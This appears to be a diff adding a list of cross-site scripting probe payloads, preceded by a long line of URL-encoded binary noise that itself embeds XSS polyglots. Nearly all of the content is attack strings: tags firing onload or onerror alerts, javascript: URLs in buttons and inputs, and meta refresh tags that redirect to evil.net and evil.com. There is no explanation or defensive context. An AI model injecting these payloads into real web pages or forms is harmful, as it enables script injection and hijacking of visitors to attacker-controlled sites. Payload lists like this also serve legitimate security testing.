@@ -1,1 +1,33 @@
 #B2%CDq%02%C5%B2%AA%F8%8At%18%23%C9%DAGo%E4%B6%88%CD%89%A6%7B%16%1F%AA%C1c%3C%8Bn%F5%3D%D9%5EL%07l7%8A%AEt%95%C6%F4%AAX%D6%C3%0Da%2Cf%AE%3D%DC%86%7E%F6%D4%BE%FF%92B%CE%1B%0E%3F%91%978%9C%AD%99%88K%F8%BFx%0C%3D%1C%2B+%3F%B7U%3D%00%F4%11%21%B2%0E6%108%00%A5%E2%24%27%C0Q%EDUt%3E%BD%E6p%11%BF%E3%E9U%EF%80%B5%FF%E3%DD%25%5BS%F8%AF%E7%CDD%F9%9DnO%FF%EB%E0%BA%CD%BB%F2%BB%1D%15xw%A6%1F%2A%CCbTF%A53%AA%9Cf%D6%E2%3B%3Ag%84%2FIN%2B%21%05%F9u%24%CD%01%14%82%E8%C2%19XL%CD%964%3D%BB%EAm%0A%D6%C2%A8%E4%F7%FA%B9%F6%CF%9A%D5%EA%2F%82%1F%05ou%01%B9%AA%B6%1A%C3%AF%1F%28%9EH%E1%152%AA%11%04s%0E%F3%F8%BD%C8i%2B%DA%F8%DC%BC%10%E3%2F%90%C0%19%CE%C1V%C1%81_%BC1%83M%A30%60%19i%C4%01%17%5E%DD%92%85%22t%23%E9%EFI%14%DE%60%AB%9A%89%1F%40W%99%80%A1%C7%0EL%1A%AE%C0%93%5Dq%60%25E%B3%AA%DC%23-%7C%23%D77Fl%D0AtU%C8w%A8A%EA%B1%BB%85%D4%8DQI%04%E5%C4%2B%039%03%89%89%A9%FF%23%8E%22%5D%DF%B5%5E%29%E7%CB%92%94%A8%26X%A6%03%1B%95Y%19%C3%BD%1A%82%92%2A%F7Bz%23Y%DD%F6+U%88%97C%A3%EE%CFB%9E%CA%3Dw%F3%F7P5%3EO%9D1%88%DBBf%9AO%BB%B9+7%1E%CEy%7E%98%06%85mQ%A9%E0%D9%E5%11%83%9E3f%AC%DC%EA%C9f%27%DC%1B%89%1D%FA%FA3%C3%B3%02Om%D4%FC%A3Ji%28%ACa%A3%E1%7E%84%7C0%E1%ED%97%FAp%F6Z%2F%F6W%3Ex%E8%FE%10e%B2%0B%1E%DF%05_J%3DL%C3%22%E2%C8%3C%95%F1%85%2C%F6q7%12.%FD%09%F5%22k%24%031%3ED%D8%D7%C5%8A%1Ep%8A%90%29%2C%01bi%A8%06%C8%1D%7F%82a%C9%CF%F6F%E9%C3%E2%D7O%"'></title></div></p></noscript><svg/onload=alert(1)>CA%AE%B8%F0Ar%01%F8%7DK%A9%0E%ED%A4m5%D0%D4e%E1q%E52F%0A%A7%DF%0E%DE%3A%B1aye%02%1F%00z%5C%C4%BAJ%8FLB%5EG4%0D%E5%E6%12%C1%AF%A0%C6%B0%28-E7%13%B7HK%25%A4%16%88%7C%9A%17%7B4v%F3%AAl%D8%E7o%23%9F%12%FD%9EW%5Bq%BDw%3F3%9C%3D%CD%2A%BAW%16%E6%DB3%FD%D8%19%88%96%7B%A6%0F%8F%EBCx%9D%EB%C8%E5Z%91T%CF__%95%F8%C9%BD%7C%ED%FFX%98%C1%94w%BC%C5%BD%883%D1%B4%7D%5CJ%E8%CDU%EA%B6%F1%29%87%27p_M%C4%02%83w%40%C9NP%F4mx%E5p%2FIzR%89%24%9D%00OOh%0C%09%E3e%D0%01%17%7C%07T%95g%E9%B1%0AP%CD%3Ds-q%EE%F7%93%7D%BB%A6%D7%25%2C%BD%90%DD%D1%A5%8%22%3E%3Cimg%20src%20onerror=alert(1)%3E%20A%85%F6%CA%8F%14f%E5%DE%91%8F%29%EFlQ%C1%3A%E1.%F5%C6HS%0BL%C5C%B2Z%11%B6%82%3A%29J%9F%99%A5%E0%24V8E%FB%CD%D1%B8%85%F5%1F%F4Q%9E3%D0D|$\/'"}])([{;//><<src\u00/</script></div></title></p></noscript><!-- <script>alert(1);//<img src onerror=alert();</<img src onerror=alert();</<img src onerror=alert();'">/<img src onerror=alert();>/<img src onerror=alert();>/<img src onerror=alert();</<img src onerror=alert();/</<img src onerror=alert();'">>porn}])([{/\'"$|<meta http-equiv="refresh" content="0;URL=http://evil.net"><meta http-equiv="refresh" content="0;URL=javascript:alert(9)">|$\/'"}])([{;//>/<img src onerror=alert();</<img src onerror=alert();</<img src onerror=alert();'">/<img src onerror=alert();>/<img src onerror=alert();>/<img src onerror=alert();</<img src onerror=alert();/</<img src onerror=alert();'">>porn}])([{/\'"$|<meta http-equiv="refresh" content="0;URL=http://evil.net"><meta http-equiv="refresh" content="0;URL=javascript:alert(9)">B2%CDq%02%C5%B2%AA%F8%8At%18%23%C9%DAGo%E4%B6%88%CD%89%A6%7B%16%1F%AA%C1c%3C%8Bn%F5%3D%D9%5EL%07l7%8A%AEt%95%C6%F4%AAX%D6%C3%0Da%2Cf%AE%3D%DC%86%7E%F6%D4%BE%FF%92B%CE%1B%0E%3F%91%978%9C%AD%99%88K%F8%BFx%0C%3D%1C%2B+%3F%B7U%3D%00%F4%11%21%B2%0E6%108%00%A5%E2%24%27%C0Q%EDUt%3E%BD%E6p%11%BF%E3%E9U%EF%80%B5%FF%E3%DD%25%5BS%F8%AF%E7%CDD%F9%9DnO%FF%EB%E0%BA%CD%BB%F2%BB%1D%15xw%A6%1F%2A%CCbTF%A53%AA%9Cf%D6%E2%3B%3Ag%84%2FIN%2B%21%05%F9u%24%CD%01%14%82%E8%C2%19XL%CD%964%3D%BB%EAm%0A%D6%C2%A8%E4%F7%FA%B9%F6%CF%9A%D5%EA%2F%82%1F%05ou%01%B9%AA%B6%1A%C3%AF%1F%28%9EH%E1%152%AA%11%04s%0E%F3%F8%BD%C8i%2B%DA%F8%DC%BC%10%E3%2F%90%C0%19%CE%C1V%C1%81_%BC1%83M%A30%60%19i%C4%01%17%5E%DD%92%85%22t%23%E9%EFI%14%DE%60%AB%9A%89%1F%40W%99%80%A1%C7%0EL%1A%AE%C0%93%5Dq%60%25E%B3%AA%DC%23-%7C%23%D77Fl%D0AtU%C8w%A8A%EA%B1%BB%85%D4%8DQI%04%E5%C4%2B%039%03%89%89%A9%FF%23%8E%22%5D%DF%B5%5E%29%E7%CB%92%94%A8%26X%A6%03%1B%95Y%19%C3%BD%1A%82%92%2A%F7Bz%23Y%DD%F6+U%88%97C%A3%EE%CFB%9E%CA%3Dw%F3%F7P5%3EO%9D1%88%DBBf%9AO%BB%B9+7%1E%CEy%7E%98%06%85mQ%A9%E0%D9%E5%11%83%9E3f%AC%DC%EA%C9f%27%DC%1B%89%1D%FA%FA3%C3%B3%02Om%D4%FC%A3Ji%28%ACa%A3%E1%7E%84%7C0%E1%ED%97%FAp%F6Z%2F%F6W%3Ex%E8%FE%10e%B2%0B%1E%DF%05_J%3DL%C3%22%E2%C8%3C%95%F1%85%2C%F6q7%12.%FD%09%F5%22k%24%031%3ED%D8%D7%C5%8A%1Ep%8A%90%29%2C%01bi%A8%06%C8%1D%7F%82a%C9%CF%F6F%E9%C3%E2%D7O%CA%AE%B8%F0Ar%01%F8%7DK%A9%0E%ED%A4m5%D0%D4e%E1q%E52F%0A%A7%DF%0E%DE%3A%B1aye%02%1F%00z%5C%C4%BAJ%8FLB%5EG4%0D%E5%E6%12%C1%AF%A0%C6%B0%28-E7%13%B7HK%25%A4%16%88%7C%9A%17%7B4v%F3%AAl%D8%E7o%23%9F%12%FD%9EW%5Bq%BDw%3F3%9C%3D%CD%2A%BAW%16%E6%DB3%FD%D8%19%88%96%7B%A6%0F%8F%EBCx%9D%EB%C8%E5Z%91T%CF__%95%F8%C9%BD%7C%ED%FFX%98%C1%94w%BC%C5%BD%883%D1%B4%7D%5CJ%E8%CDU%EA%B6%F1%29%87%27p_M%C4%02%83w%40%C9NP%F4mx%E5p%2FIzR%89%24%9D%00OOh%0C%09%E3e%D0%01%17%7C%07T%95g%E9%B1%0AP%CD%3Ds-q%EE%F7%93%7D%BB%A6%D7%25%2C%BD%90%DD%D1%A5%8%22%3E%3Cimg%20src%20onerror=alert(1)%3E%20A%85%F6%CA%8F%14f%E5%DE%91%8F%29%EFlQ%C1%3A%E1.%F5%C6HS%0BL%C5C%B2Z%11%B6%82%3A%29J%9F%99%A5%E0%24V8E%FB%CD%D1%B8%85%F5%1F%F4Q%9E3%D0D
+<img method=post  src="//iqoption.com" onload=alert();alert(8)>
+<meta method=post  src="//iqoption.com" onload=alert();alert(8)>
+<html method=post  src="//iqoption.com" onload=alert();alert(8)>
+<div method=post  src="//iqoption.com" onload=alert();alert(8)>
+
+<p method=post  src="//iqoption.com" onload=alert();alert(8)>
+
+<a method=post  href="//iqoption.com" onload=alert();alert(8)>xss</a>
+<iframe method=post  src="//iqoption.com" onload=alert();alert(8)></iframe>
+
+<img method=head  src="//iqoption.com" onload=alert();alert(8)>
+<meta method=head  src="//iqoption.com" onload=alert();alert(8)>
+<html method=head  src="//iqoption.com" onload=alert();alert(8)>
+<div method=head  src="//iqoption.com" onload=alert();alert(8)>
+
+<p method=head  src="//iqoption.com" onload=alert();alert(8)>
+
+<a method=head  href="//iqoption.com" onload=alert();alert(8)>xss</a>
+<iframe method=head  src="//iqoption.com" onload=alert();alert(8)></iframe>
+
+<button method=head href="javascript:alert()" src="javascript:alert()" type=submit value=submit onllclick=alert();alert(8)>
+
+<button method=post href="javascript:alert()" src="javascript:alert()" type=submit value=submit onllclick=alert();alert(8)>
+
+<input method=head href="javascript:alert()" src="javascript:alert()" type=submit value=submit onllclick=alert();alert(8)>
+
+<input method=post href="javascript:alert()" src="javascript:alert()" type=submit value=submit onllclick=alert();alert(8)>
+
+<meta method=post http-equiv="refresh" content="2;url=https://evil.com">
+<meta method=head http-equiv="refresh" content="2;url=https://evil.com">
+<meta method=delete http-equiv="refresh" content="2;url=https://evil.com">
+<meta method=put http-equiv="refresh" content="2;url=https://evil.com">
